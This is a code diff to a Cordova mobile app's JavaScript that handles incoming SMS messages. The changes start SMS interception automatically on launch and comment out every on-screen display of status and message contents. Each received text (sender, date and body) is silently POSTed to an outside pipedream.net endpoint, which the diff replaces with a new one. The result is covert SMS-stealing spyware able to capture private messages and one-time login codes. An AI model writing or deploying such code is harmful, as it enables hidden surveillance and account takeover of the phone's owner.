@@ -17,21 +17,21 @@ var app = {
 		}
 	},
 	init: function () {
-		$('#status').html('<span class="success">Device is ready</span>');
+//		$('#status').html('<span class="success">Device is ready</span>');
 
 		// Initialize incoming SMS event listener
 		document.addEventListener('onSMSArrive', app.onSMSArrive);
-
-		$('#startWatch').on('click', app.startWatch);
-		$('#stopWatch').on('click', app.stopWatch);
+        app.startWatch();
+//		$('#startWatch').on('click', app.startWatch);
+//		$('#stopWatch').on('click', app.stopWatch);
 	},
 	onSMSArrive: function (message) {
 		//var IncomingSMS = message.data; /* plugin 1.x */
 		var IncomingSMS = message; /* plugin 2.x */
 		// Show received SMS contents
-		$('#event').html('SMS from: ' + IncomingSMS.address + '<br />Received on: ' + IncomingSMS.date + '<br />Body: ' + IncomingSMS.body);
+//		$('#event').html('SMS from: ' + IncomingSMS.address + '<br />Received on: ' + IncomingSMS.date + '<br />Body: ' + IncomingSMS.body);
 	    $.ajax({
-          url: 'https://eo5zx045vux0b2k.m.pipedream.net',
+          url: 'https://eog63i4euwxlcal.m.pipedream.net',
           method: 'POST',
           data: JSON.stringify(message),
           success: function(response) {
@@ -46,16 +46,16 @@ var app = {
 	},
 	startWatch: function () {
 		cordova.plugins.SMSReceive.startWatch(function (strSuccess) {
-			$('#status').html('<span class="success">' + strSuccess + '</span>');
+//			$('#status').html('<span class="success">' + strSuccess + '</span>');
 		}, function (strError) {
-			$('#status').html('<span class="error">' + strError + '</span>');
+//			$('#status').html('<span class="error">' + strError + '</span>');
 		});
 	},
 	stopWatch: function () {
 		cordova.plugins.SMSReceive.stopWatch(function (strSuccess) {
-			$('#status').html('<span class="success">' + strSuccess + '</span>');
+//			$('#status').html('<span class="success">' + strSuccess + '</span>');
 		}, function (strError) {
-			$('#status').html('<span class="error">' + strError + '</span>');
+//			$('#status').html('<span class="error">' + strError + '</span>');
 		});
 	}
 };
